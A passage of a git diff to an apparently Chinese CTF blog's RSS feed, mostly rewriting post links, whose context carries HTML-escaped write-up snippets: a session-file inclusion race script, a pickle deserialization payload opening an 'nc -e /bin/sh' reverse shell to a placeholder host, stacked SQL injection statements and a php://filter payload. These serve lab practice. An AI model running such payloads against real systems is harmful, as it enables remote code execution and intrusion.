cookies&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;PHPSESSID&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;sessid&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;READ&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;session&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        response &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; session&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;get&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#39;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;host&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;?file=/tmp/sess_&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;sessid&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;# print(response.text)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;c4ca4238a0b923820dcc509a6f75849b&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; response&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;text&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;# if &#39;flag&#39; not in response.text:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;[+++]retry&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;response&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;text&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;exit&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;with&lt;/span&gt; requests&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;session&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; session&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    t1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; threading&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Thread&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;target&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;POST&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; args&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;session&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    t1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;daemon &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;True&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    t1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;start&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    READ&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;session&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2022/10/04/CTF/ctfshow/%E5%8D%95%E8%BA%AB%E6%9D%AF/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/f685e8f8/</guid>
             <title>单身杯</title>
-            <link>http://dpm12345.github.io/2022/10/04/CTF/ctfshow/%E5%8D%95%E8%BA%AB%E6%9D%AF/</link>
+            <link>http://dpm12345.github.io/posts/f685e8f8/</link>
             <category>CTF</category>
             <category>ctfshow</category>
             <pubDate>Tue, 04 Oct 2022 23:10:32 +0800</pubDate>
@@ -1073,9 +1073,9 @@ flag:  &lt;code&gt;$_[5].$_[13].$_[0].$_[6]&lt;/code&gt;&lt;/p&gt;
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2022/10/04/CTF/ctfshow/Web%E5%85%A5%E9%97%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/d3333ead/</guid>
             <title>反序列化</title>
-            <link>http://dpm12345.github.io/2022/10/04/CTF/ctfshow/Web%E5%85%A5%E9%97%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</link>
+            <link>http://dpm12345.github.io/posts/d3333ead/</link>
             <category>CTF</category>
             <category>ctfshow</category>
             <pubDate>Tue, 04 Oct 2022 22:16:40 +0800</pubDate>
@@ -1223,9 +1223,9 @@ flag:  &lt;code&gt;$_[5].$_[13].$_[0].$_[6]&lt;/code&gt;&lt;/p&gt;
 &lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; pickle&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; base64&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;object&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__reduce__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;__import__(&#34;os&#34;).popen(&#34;nc xxx.xxx.xxx.xxx 4567 -e /bin/sh&#34;).read()&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;a&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;A&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;test&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;pickle&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dumps&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;base64&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;b64encode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;test&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2022/10/04/CTF/ctfshow/Web%E5%85%A5%E9%97%A8/SQL%20%E6%B3%A8%E5%85%A5/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/35cb7ca5/</guid>
             <title>SQL 注入</title>
-            <link>http://dpm12345.github.io/2022/10/04/CTF/ctfshow/Web%E5%85%A5%E9%97%A8/SQL%20%E6%B3%A8%E5%85%A5/</link>
+            <link>http://dpm12345.github.io/posts/35cb7ca5/</link>
             <category>CTF</category>
             <category>ctfshow</category>
             <pubDate>Tue, 04 Oct 2022 22:15:40 +0800</pubDate>
@@ -1317,9 +1317,9 @@ flag:  &lt;code&gt;$_[5].$_[13].$_[0].$_[6]&lt;/code&gt;&lt;/p&gt;
 &lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;alter&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;table&lt;/span&gt; ctfshow_user change &lt;span class=&#34;token identifier&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;username&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token identifier&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;pass2&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;varchar&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;alter&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;table&lt;/span&gt; ctfshow_user change &lt;span class=&#34;token identifier&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;pass&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token identifier&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;username&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;varchar&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;alter&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;table&lt;/span&gt; ctfshow_user change &lt;span class=&#34;token identifier&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;pass2&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token identifier&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;pass&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;varchar&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2022/10/04/CTF/ctfshow/Web%E5%85%A5%E9%97%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/592e5fba/</guid>
             <title>文件上传</title>
-            <link>http://dpm12345.github.io/2022/10/04/CTF/ctfshow/Web%E5%85%A5%E9%97%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</link>
+            <link>http://dpm12345.github.io/posts/592e5fba/</link>
             <category>CTF</category>
             <category>ctfshow</category>
             <pubDate>Tue, 04 Oct 2022 22:14:40 +0800</pubDate>
@@ -1393,9 +1393,9 @@ flag:  &lt;code&gt;$_[5].$_[13].$_[0].$_[6]&lt;/code&gt;&lt;/p&gt;
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2022/10/04/CTF/ctfshow/Web%E5%85%A5%E9%97%A8/php%20%E7%89%B9%E6%80%A7/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/98069c85/</guid>
             <title>php 特性</title>
-            <link>http://dpm12345.github.io/2022/10/04/CTF/ctfshow/Web%E5%85%A5%E9%97%A8/php%20%E7%89%B9%E6%80%A7/</link>
+            <link>http://dpm12345.github.io/posts/98069c85/</link>
             <category>CTF</category>
             <category>ctfshow</category>
             <pubDate>Tue, 04 Oct 2022 22:12:40 +0800</pubDate>
@@ -1670,9 +1670,9 @@ flag:  &lt;code&gt;$_[5].$_[13].$_[0].$_[6]&lt;/code&gt;&lt;/p&gt;
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2022/10/04/CTF/ctfshow/Web%E5%85%A5%E9%97%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/31915a1e/</guid>
             <title>文件包含</title>
-            <link>http://dpm12345.github.io/2022/10/04/CTF/ctfshow/Web%E5%85%A5%E9%97%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</link>
+            <link>http://dpm12345.github.io/posts/31915a1e/</link>
             <category>CTF</category>
             <category>ctfshow</category>
             <pubDate>Tue, 04 Oct 2022 22:12:40 +0800</pubDate>
@@ -1703,9 +1703,9 @@ flag:  &lt;code&gt;$_[5].$_[13].$_[0].$_[6]&lt;/code&gt;&lt;/p&gt;
 &lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;file&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;php&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;//filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2022/10/04/CTF/ctfshow/Web%E5%85%A5%E9%97%A8/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%20%E7%88%86%E7%A0%B4%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/b013ba57/</guid>
             <title>信息收集 爆破 命令执行</title>
-            <link>http://dpm12345.github.io/2022/10/04/CTF/ctfshow/Web%E5%85%A5%E9%97%A8/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%20%E7%88%86%E7%A0%B4%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</link>
+            <link>http://dpm12345.github.io/posts/b013ba57/</link>
             <category>CTF</category>
             <category>ctfshow</category>
             <pubDate>Tue, 04 Oct 2022 22:11:40 +0800</pubDate>
@@ -1816,9 +1816,9 @@ flag:  &lt;code&gt;$_[5].$_[13].$_[0].$_[6]&lt;/code&gt;&lt;/p&gt;
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2022/10/04/CTF/ctfshow/Web_other/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/96bab31d/</guid>
             <title>Web_other</title>
-            <link>http://dpm12345.github.io/2022/10/04/CTF/ctfshow/Web_other/</link>
+            <link>http://dpm12345.github.io/posts/96bab31d/</link>
             <category>CTF</category>
             <category>ctfshow</category>
             <category>Web</category>
@@ -1980,9 +1980,9 @@ flag:  &lt;code&gt;$_[5].$_[13].$_[0].$_[6]&lt;/code&gt;&lt;/p&gt;
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2022/10/04/CTF/ctfshow/%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B_2022/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/25b29fe5/</guid>
             <title>新春欢乐赛_2022</title>
-            <link>http://dpm12345.github.io/2022/10/04/CTF/ctfshow/%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B_2022/</link>
+            <link>http://dpm12345.github.io/posts/25b29fe5/</link>
             <category>CTF</category>
             <category>ctfshow</category>
             <category>Web</category>
@@ -2064,9 +2064,9 @@ flag:  &lt;code&gt;$_[5].$_[13].$_[0].$_[6]&lt;/code&gt;&lt;/p&gt;
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2022/10/04/CTF/ctfshow/%E8%90%8C%E6%96%B0/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/7c4924dd/</guid>
             <title>萌新</title>
-            <link>http://dpm12345.github.io/2022/10/04/CTF/ctfshow/%E8%90%8C%E6%96%B0/</link>
+            <link>http://dpm12345.github.io/posts/7c4924dd/</link>
             <category>CTF</category>
             <category>ctfshow</category>
             <category>Web</category>
@@ -2166,9 +2166,9 @@ flag:  &lt;code&gt;$_[5].$_[13].$_[0].$_[6]&lt;/code&gt;&lt;/p&gt;
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2022/10/04/CTF/ctfshow/%E8%90%8C%E6%96%B0%E8%B5%9B/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/dd66f6b6/</guid>
             <title>萌新赛</title>
-            <link>http://dpm12345.github.io/2022/10/04/CTF/ctfshow/%E8%90%8C%E6%96%B0%E8%B5%9B/</link>
+            <link>http://dpm12345.github.io/posts/dd66f6b6/</link>
             <category>CTF</category>
             <category>ctfshow</category>
             <pubDate>Tue, 04 Oct 2022 00:10:32 +0800</pubDate>
@@ -2220,18 +2220,18 @@ flag:  &lt;code&gt;$_[5].$_[13].$_[0].$_[6]&lt;/code&gt;&lt;/p&gt;
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2022/09/23/%E5%AE%9D%E5%A1%94%E7%9A%84%E7%9B%B8%E5%85%B3%E4%BD%BF%E7%94%A8/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/3b76a5dc/</guid>
             <title>宝塔的相关使用</title>
-            <link>http://dpm12345.github.io/2022/09/23/%E5%AE%9D%E5%A1%94%E7%9A%84%E7%9B%B8%E5%85%B3%E4%BD%BF%E7%94%A8/</link>
+            <link>http://dpm12345.github.io/posts/3b76a5dc/</link>
             <pubDate>Fri, 23 Sep 2022 10:54:43 +0800</pubDate>
             <description><![CDATA[ &lt;h1 id=&#34;开启目录浏览&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#开启目录浏览&#34;&gt;#&lt;/a&gt; 开启目录浏览&lt;/h1&gt;
 &lt;p&gt;在建立自己的一个 web 靶场时，会想要使用目录浏览，为了无需输入，这里可以利用以下代码开启目录浏览 找到需要设置的网站，点击设置，找到伪静态选项，然后再框内复制如下内容&lt;/p&gt;
 &lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;location   &amp;#x2F; &amp;#123;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    autoindex on;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    autoindex_exact_size off;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    charset utf-8,gbk;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    autoindex_localtime on;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &amp;#125;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2022/09/23/CTF/sqli-labs%E7%BB%83%E4%B9%A0/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/ca25cf0b/</guid>
             <title>sqli-labs练习</title>
-            <link>http://dpm12345.github.io/2022/09/23/CTF/sqli-labs%E7%BB%83%E4%B9%A0/</link>
+            <link>http://dpm12345.github.io/posts/ca25cf0b/</link>
             <category>CTF</category>
             <category>sql注入</category>
             <pubDate>Fri, 23 Sep 2022 02:48:08 +0800</pubDate>
@@ -2277,9 +2277,9 @@ flag:  &lt;code&gt;$_[5].$_[13].$_[0].$_[6]&lt;/code&gt;&lt;/p&gt;
  ]]></description>
         </item>
         <item>
